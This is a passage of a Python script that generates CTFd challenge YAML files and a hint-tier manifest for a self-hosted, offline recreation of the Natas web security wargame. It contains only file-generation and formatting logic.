os.makedirs(base_dir, exist_ok=True)

for i, ch in enumerate(challenges_data):
    folder_path = os.path.join(base_dir, ch["id"])
    os.makedirs(folder_path, exist_ok=True)

    is_final_level = (i == len(challenges_data) - 1)

    sep_after_task = "\n\n"
    if "desc" in ch:
        # natas-start-here carries a fully hand-written description.
        full_desc = ch["desc"]
    else:
        # Every level assembles to: ## Goal / --- / ### Get there /
        # ### The task / **Commands you may need:** / **Helpful reading:**
        level = int(ch["id"].rsplit("-", 1)[1])
        full_desc = (
            f"## Goal\n{ch['goal']}\n\n---\n\n"
            f"{_get_there(level)}\n\n"
            f"### The task\n{ch['task']}"
        )
        # natas-07 has no task body: its commands line follows the
        # "### The task" heading directly (the heading's own newline),
        # not after a blank line.
        sep_after_task = "\n\n" if ch["task"] else ""
    extra_info = EXTRA_INFO.get(ch["id"])
    if extra_info:
        cmds, reading = extra_info
        if cmds:
            cmd_list = ", ".join(f"`{c}`" for c in cmds)
            full_desc += f"{sep_after_task}**Commands you may need:** {cmd_list}"
        if reading:
            # No live links: the venue network runs with no internet access
            # (see docs/offline-dependency-audit.md and
            # cei-labs-event#8/live-hint-links-offline-gap), so these are
            # rendered as plain reference titles rather than clickable
            # [title](url) markdown links, which would be dead at the venue.
            links = "\n".join(f"- {title}" for title, url in reading)
            full_desc += f"\n\n**Helpful reading:**\n{links}"

    indented_description = "\n".join(
        "  " + line if line else "" for line in full_desc.splitlines()
    )
    yaml_content = f"""name: "{ch['name']}"
author: "CEI Labs (self-hosted recreation of OverTheWire's Natas)"
category: "Web Security"
description: |
{indented_description}
value: {ch['points']}
type: standard
flags:
{_flags_yaml(ch['flag'])}state: visible
version: "0.1"
instance_type: target-attacker
target_image: {NATAS_TARGET_IMAGE}
attacker_image: {NATAS_ATTACKER_IMAGE}
instance_group: {INSTANCE_GROUP}
shutdown_on_solve: {"true" if is_final_level else "false"}
show_launcher: {"true" if ch["id"] == "natas-start-here" else "false"}
"""

    # Managed by the plugin manifest, never CTFd native hints.

    file_path = os.path.join(folder_path, "challenge.yml")
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(yaml_content)

print(f"Successfully generated {len(challenges_data)} Natas challenges inside the '{base_dir}' folder!")
with open(os.path.join(base_dir, "natas-hint-wallet.json"), "w", encoding="utf-8") as manifest:
    json.dump(
        {
            "schema_version": 1,
            "track": "natas",
            "entries": [
                {
                    "name": c["name"],
                    "tiers": [
                        {
                            "tier": n,
                            "cost": cost,
                            "content": _render_hint(c["id"], n, text),
                        }
                        for n, (text, cost) in enumerate(
                            managed_tiers(c["points"], HINTS[c["id"]]), 1
                        )
                    ],
                }
                for c in challenges_data
                if c["id"] in HINTS
            ],
        },
        manifest,
    )
